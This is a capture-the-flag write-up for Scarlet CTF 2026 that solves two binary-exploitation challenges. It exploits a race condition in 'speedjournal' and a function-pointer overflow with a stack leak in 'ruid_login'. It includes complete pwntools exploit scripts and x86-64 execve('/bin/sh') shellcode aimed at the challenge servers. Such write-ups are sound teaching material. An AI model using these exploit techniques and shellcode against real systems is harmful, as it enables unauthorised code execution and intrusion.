# Scarlet CTF 2026

## speedjournal
<primary-label ref="pwn"/>

There's a 1000 millisecond race-window
```c
#define WAIT_TIME 1000

void *logout_thread(void *arg) {
    usleep(WAIT_TIME);
    is_admin = 0;
    return NULL;
}

void login_admin() {
    char pw[32];
    printf("Admin password: ");
    fgets(pw, sizeof(pw), stdin);

    if (strncmp(pw, "supersecret\n", 12) == 0) {
        is_admin = 1;

        pthread_t t;
        pthread_create(&t, NULL, logout_thread, NULL);
        pthread_detach(t);

        puts("[+] Admin logged in (temporarily)");
    } else {
        puts("[-] Wrong password");
    }
}

void read_log() {
    int idx;
    printf("Index: ");
    scanf("%d", &idx);
    getchar();

    if (idx < 0 || idx >= log_count) {
        puts("Invalid index");
        return;
    }

    if (logs[idx].restricted && !is_admin) {
        puts("Access denied");
        return;
    }

    printf("Log: %s\n", logs[idx].content);
}
```

Flag was placed in logs[0], which is required to is_admin flag for access.

I gained stable race-window with no-receiving.

```py
from pwn import *

p = remote('challs.ctf.rusec.club', 22169)

# Send all inputs rapidly
p.sendline(b'1')          
p.sendline(b'supersecret')
p.sendline(b'3')          
p.sendline(b'0')          

p.interactive()
```
## ruid_login
<primary-label ref="pwn"/>

* checksec
checksec ruid_login
[*] '/home/tsuneki/dc/ctf/scarlet/ruid_login'
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No

The vulnerability was the obvious buffer overflow in .bss segment in function:`dean`.

Luckily, the function pointer was located adjacent to and behind the buffer, hijacking rip was quite easy.

```c
004014d2    int64_t dean()

004014da        void* fsbase
004014da        int64_t rax = *(fsbase + 0x28)
004014f3        puts(str: "Change a staff member's name!")
004014f8        list_ruids()
00401510        int32_t var_14
00401510        
00401510        if (get_number(&var_14, 2) != 0)
00401521            printf(format: "New name: ")
0040154f            read(fd: 0, buf: zx.q(var_14) * 0x30 + &users, nbytes: 0x29)
0040154f        
00401564        if (rax == *(fsbase + 0x28))
0040156c            return rax - *(fsbase + 0x28)
0040156c        
00401566        __stack_chk_fail()
00401566        noreturn
```

Also, rand() which used to identify the member is predictable.

Since I could implement non-null terminated buffer, I leaked the stack address via `%s`.

```c
00401667    int32_t main(int32_t argc, char** argv, char** envp)

0040166f        void* fsbase
0040166f        int64_t rax = *(fsbase + 0x28)
0040168d        setbuf(fp: __bss_start, buf: nullptr)
004016a1        setbuf(fp: stdin, buf: nullptr)
004016a6        setup_users()
004016b5        puts(str: "Welcome to Rutgers University!")
004016c9        printf(format: "Please enter your netID: ")
004016ce        int64_t buf
004016ce        __builtin_memset(dest: &buf, ch: 0, count: 0x40)
0040171f        read(fd: 0, &buf, nbytes: 0x40)
0040173a        *(&buf + strcspn(&buf, "\n")) = 0
00401755        printf(format: "Accessing secure interface as netid '%s'\n", &buf, 
00401755            "Accessing secure interface as netid '%s'\n")
```

```py
from pwn import *
from icecream import ic
import sys
import re
import inspect

e = ELF("ruid_login",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc challs.ctf.rusec.club 4622"
if "nc" in nc:
    HOST = nc.split(" ")[1]
    PORT = int(nc.split(" ")[2])
if "http" in nc:
    from urllib.parse import urlparse
    HOST = urlparse(nc).hostname
    PORT = urlparse(nc).port

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sln  = lambda b: io.sendline(str(b).encode())
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b,drop=True)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
fsp = lambda b : f"%{b}$p".encode()
shell = lambda : io.interactive()

def hl(v: int): print(f"{(m := re.search(r'hl\s*\(\s*(.+?)\s*\)', inspect.getframeinfo(inspect.currentframe().f_back).code_context[0].strip())) and m.group(1) or '?'}: {hex(v)}")

payload = b""
def rst():global payload;payload = b"";log.info("***PAYLOAD RESET***")
def pay(*args, **kwargs): global payload; payload += b"".join([a if type(a) == bytes else (a.encode() if type(a) == str else p64(a)) for a in args])


r()

a = asm("""
    	xor rsi,rsi
	push rsi
	mov rdi,0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	push 59
	pop rax
	cdq
	syscall
        """)

rst()
a = a.ljust(0x3f, b"A")
pay(
    a,
    b"B"
)
s(payload)
ru(b"B")
leak = ru(b"'")
ic(leak)
leak = pu64(leak)
hl(leak)

sln(0x00000000327b23c6)

sln(1)

rst()

shellcode_ptr = leak - (0x7fff73cb8f90 - 0x7fff73cb8e60)


pay(
    b"A"*32,
    shellcode_ptr
)
sl(payload)

sln(0x00000000327b230a)


shell()

"""
      0x557016f8f0e0|+0x0008|+001: 0x6f737365666f7250 'Professor'
      0x557016f8f0e8|+0x0010|+002: 0x0000000000000072
      0x557016f8f0f0|+0x0018|+003: 0x0000000000000000
      0x557016f8f0f8|+0x0020|+004: 0x0000000000000000
      0x557016f8f100|+0x0028|+005: 0x0000557016f8c2f3 <prof>  ->  0x20ec8348e5894855
      0x557016f8f108|+0x0030|+006: 0x000000006b8b4567
      0x557016f8f110|+0x0038|+007: 0x000000006e616544 ('Dean'?)
      0x557016f8f118|+0x0040|+008: 0x0000000000000000
      0x557016f8f120|+0x0048|+009: 0x0000000000000000
      0x557016f8f128|+0x0050|+010: 0x0000000000000000
      0x557016f8f130|+0x0058|+011: 0x0000557016f8c4d2 <dean>  ->  0x10ec8348e5894855
      0x557016f8f138|+0x0060|+012: 0x00000000327b23c6
"""
```
